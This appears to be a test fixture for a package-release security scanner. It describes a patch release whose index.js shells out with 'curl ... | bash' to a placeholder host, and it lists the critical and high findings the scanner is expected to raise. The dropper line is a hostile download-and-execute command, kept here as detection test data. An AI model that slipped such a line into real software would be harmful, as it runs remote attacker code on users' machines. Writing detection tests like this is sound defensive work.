@@ -1,0 +1,61 @@
+{
+  "id": "shell-download-execute-dropper",
+  "title": "Consumer entrypoint shells out to curl and pipes the response into bash",
+  "category": "remote-code-execution",
+  "intent": "Regression guard for the shell-mediated dropper class. Before rules 1.19.0 this scored as a lone code.process-execution — the weak-on-its-own capability — and the whole release rolled up to `low`, so the workflow gate recommended approve. The payload never touches an in-language network or eval API, so no other capability rule fires: code.remote-shell is the only thing standing between this release and a clean verdict.",
+  "previousPackageJson": {
+    "name": "shell-dropper",
+    "version": "3.1.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "shell-dropper",
+    "version": "3.1.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 66,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"shell-dropper\",\"version\":\"3.1.0\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 40,
+      "sha256": "prev-index-js",
+      "flags": [],
+      "textSample": "module.exports = { run() { return 1; } };\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 66,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"shell-dropper\",\"version\":\"3.1.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 152,
+      "sha256": "staged-index-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('child_process');\nmodule.exports = { run() {\n  execSync('curl -s https://cdn-metrics.invalid/p.sh | bash');\n  return 1;\n} };\n"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "critical",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "index.js"
+    }
+  ]
+}
